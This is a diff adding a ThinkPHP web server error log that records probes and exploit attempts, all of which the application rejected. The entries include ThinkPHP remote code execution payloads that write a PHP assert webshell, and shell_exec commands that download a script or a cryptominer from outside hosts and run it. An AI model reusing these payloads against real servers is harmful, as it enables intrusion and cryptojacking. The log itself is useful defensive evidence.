@@ -1,0 +1,39 @@
+[ 2018-12-24T05:45:34+08:00 ] 102.165.39.30 /servlet?p=login&q=loginForm&jumpto=status
+ERR: 无法加载控制器:Servlet
+
+[ 2018-12-24T05:54:46+08:00 ] 61.244.184.228 /index.php?s=index/%5Cthink%5CRequest/input&filter=system&data=echo%20%5E%3C?php%20@assert($_POST[mds]);?%5E%3E%20%3Emedusa.php
+ERR: 非法操作:\think\Request
+
+[ 2018-12-24T06:01:55+08:00 ] 61.244.184.228 /index.php?s=index/%5Cthink%5Ctemplate%5Cdriver%5Cfile/write&cacheFile=medusa.php&content=%3C?php%20@assert($_POST[mds]);?%3E
+ERR: 非法操作:\think\template\driver\file
+
+[ 2018-12-24T06:10:10+08:00 ] 61.244.184.228 /index.php?s=index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20%5E%3C?php%20@assert($_POST[mds]);?%5E%3E%20%3Emedusa.php
+ERR: 非法操作:\think\app
+
+[ 2018-12-24T06:17:31+08:00 ] 61.244.184.228 /index.php?s=index/%5Cthink%5CContainer/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20%5E%3C?php%20@assert($_POST[mds]);?%5E%3E%20%3Emedusa.php
+ERR: 非法操作:\think\Container
+
+[ 2018-12-24T07:53:50+08:00 ] 61.244.184.228 /index.php?s=index/%5Cthink%5CRequest/input&filter=system&data=echo%20%22%3C?php%20@assert(%5C$_POST[mds]);?%3E%22%20%3Emedus.php
+ERR: 非法操作:\think\Request
+
+[ 2018-12-24T08:01:01+08:00 ] 61.244.184.228 /index.php?s=index/%5Cthink%5Ctemplate%5Cdriver%5Cfile/write&cacheFile=medus.php&content=%3C?php%20@assert(%5C$_POST[mds]);?%3E
+ERR: 非法操作:\think\template\driver\file
+
+[ 2018-12-24T08:08:24+08:00 ] 61.244.184.228 /index.php?s=index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20%22%3C?php%20@assert(%5C$_POST[mds]);?%3E%22%20%3Emedus.php
+ERR: 非法操作:\think\app
+
+[ 2018-12-24T08:16:27+08:00 ] 61.244.184.228 /index.php?s=index/%5Cthink%5CContainer/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20%22%3C?php%20@assert(%5C$_POST[mds]);?%3E%22%20%3Emedus.php
+ERR: 非法操作:\think\Container
+
+[ 2018-12-24T08:58:06+08:00 ] 198.12.97.71 /index.php?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;%20wget%20http://80.211.89.146/t.sh;%20chmod%20+x%20t.sh;%20sh%20t.sh;rm%20-rf%20t.sh
+ERR: 非法操作:\think\app
+
+[ 2018-12-24T13:39:09+08:00 ] 209.141.35.236 /index.php?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;%20wget%20http://205.185.113.123/mcoin;%20chmod%20777%20mcoin;%20./mcoin%20-o%20205.185.113.123:3333%20-p%20x%20-k%20-a%20cryptonight%20-B%20--max-cpu-usage=90;%20rm%20-rf%20RjsWs
+ERR: 非法操作:\think\app
+
+[ 2018-12-24T16:59:27+08:00 ] 118.25.44.25 /webdav/
+ERR: 无法加载控制器:Webdav
+
+[ 2018-12-24T17:00:37+08:00 ] 118.25.44.25 /manager/html
+ERR: 无法加载控制器:Manager
+
